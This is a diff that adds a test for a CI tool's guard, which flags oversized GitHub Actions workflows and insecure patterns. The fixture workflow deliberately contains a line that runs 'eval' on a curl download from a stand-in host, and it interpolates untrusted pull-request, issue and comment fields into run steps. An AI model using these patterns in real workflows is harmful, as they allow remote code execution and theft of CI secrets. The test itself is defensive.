@@ -265,6 +265,83 @@ describe('holo-ci verify & guards', () => {
       rmSync(dir, { recursive: true, force: true });
     }
   });
+
+  it('enforces noWorkflowBloat guard: passes thin declarative YAML and flags >140-line YAML, eval $(...), and untrusted github.event.* in run:', () => {
+    const dir = makeTempDir('holo-ci-workflow-bloat-');
+    try {
+      mkdirSync(join(dir, '.github', 'workflows'), { recursive: true });
+      writeFileSync(join(dir, 'README.md'), '# Workflow Bloat Test\n', 'utf8');
+
+      const thinWorkflow = [
+        'name: Thin Declarative CI',
+        'on: [push]',
+        'jobs:',
+        '  test:',
+        '    runs-on: ubuntu-latest',
+        '    steps:',
+        '      - uses: actions/checkout@v7',
+        '      - name: Safe env usage',
+        '        env:',
+        '          PR_TITLE: ${{ github.event.pull_request.title }}',
+        '          HEAD_REF: ${{ github.head_ref }}',
+        '        run: |',
+        '          node holo-ci/cli.mts verify --config holo-ci.json',
+        '          printf "%s\\n" "$PR_TITLE"',
+        '',
+      ].join('\n');
+      writeFileSync(join(dir, '.github', 'workflows', 'thin.yml'), thinWorkflow, 'utf8');
+
+      const manifest: HoloCiManifest = {
+        schema: HOLO_CI_SCHEMA,
+        name: 'workflow-bloat-test',
+        kind: 'control-plane',
+        docs: ['README.md'],
+        guards: { noWorkflowBloat: true },
+      };
+
+      const passRes = runVerify(manifest, { cwd: dir, skipTests: true, skipGates: true });
+      assert.equal(passRes.ok, true);
+      assert.equal(passRes.guardViolations.length, 0);
+
+      // Add a bloated (>140 lines) workflow plus eval "$(...)" and untrusted context interpolations inside run:
+      const bloatedLines = [
+        'name: Bloated Insecure Workflow',
+        'on: [pull_request_target, issue_comment]',
+        'jobs:',
+        '  bad:',
+        '    runs-on: ubuntu-latest',
+        '    steps:',
+        '      - name: Inline injection',
+        '        run: echo "${{ github.event.pull_request.title }}"',
+        '      - name: Multi-line eval & context injection',
+        '        run: |',
+        '          eval "$(curl -fsSL https://example.invalid/setup.sh)"',
+        '          eval $(echo safe)',
+        '          echo "${{ github.event.issue.body }}"',
+        '          echo "${{ github.event.pull_request.body }}"',
+        '          echo "${{ github.head_ref }}"',
+        '          echo "${{ github.event.comment.body }}"',
+        '          echo "allowed" # holo-ci-allow-guard',
+      ];
+      while (bloatedLines.length <= 145) {
+        bloatedLines.push(`          # padding line ${bloatedLines.length + 1}`);
+      }
+      writeFileSync(join(dir, '.github', 'workflows', 'bad.yml'), `${bloatedLines.join('\n')}\n`, 'utf8');
+
+      const failRes = runVerify(manifest, { cwd: dir, skipTests: true, skipGates: true });
+      assert.equal(failRes.ok, false);
+      assert.ok(failRes.guardViolations.every((v) => v.guard === 'noWorkflowBloat'));
+      // 1 line-count violation + 1 inline pull_request.title + 2 evals + 4 multiline untrusted context interpolations = 8
+      assert.equal(failRes.guardViolations.length, 8);
+      assert.match(failRes.guardViolations[0].snippet, /exceed|has \d+ lines \(max 140\)/i);
+
+      // Custom maxWorkflowLines threshold
+      const customThreshold = scanGuardViolations(dir, { noWorkflowBloat: true, maxWorkflowLines: 10 });
+      assert.ok(customThreshold.some((v) => v.file === '.github/workflows/thin.yml' && /max 10/.test(v.snippet)));
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
 });
 
 describe('holo-ci sync', () => {
